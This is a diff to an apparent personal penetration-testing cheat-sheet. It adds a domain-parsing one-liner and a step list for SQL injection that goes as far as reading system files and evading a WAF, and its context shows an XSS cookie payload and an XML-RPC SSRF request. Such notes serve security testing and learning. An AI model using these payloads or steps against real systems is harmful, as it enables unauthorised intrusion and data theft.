@@ -68,6 +68,15 @@ Putting this here as I always forget it :)
 ```
 
 
+**Grepping Root Subdomains From File**
+
+```powershell
+
+
+echo http://aidan.aidan.es-us.aidan.test.test..aidan.news.yahoo.com | rev | cut -d . -f 2-4 | rev
+
+```
+
 
 **Port Scanning IP Ranges**
 
@@ -1473,9 +1482,6 @@ x=Ë
 1E÷ù»v¶é´0è~ àø
 R
 R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
-
-
-
 ```
 
 
@@ -1511,4 +1517,21 @@ SSRF
 </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
 </value></param></params>
 </methodCall>
+```
+
+
+
+
+#### SQL Injection
+
+```powershell
+
+1)Error generation with untrusted input or special characters.
+2)Finding total number of columns with order by or group by or having.
+3)Finding vulnerable columns with union operator.
+4)Extracting basic information like database(), version(), user(), UUID() with concat() or group_concat().
+5)Extracting full table and column names with group_concat() and extracting the data with same function.
+6)Checking file privileges with file_priv.
+7)Accessing system files with load_file(). and advance exploitation afterwards.
+WAF evasion if any.
 ```
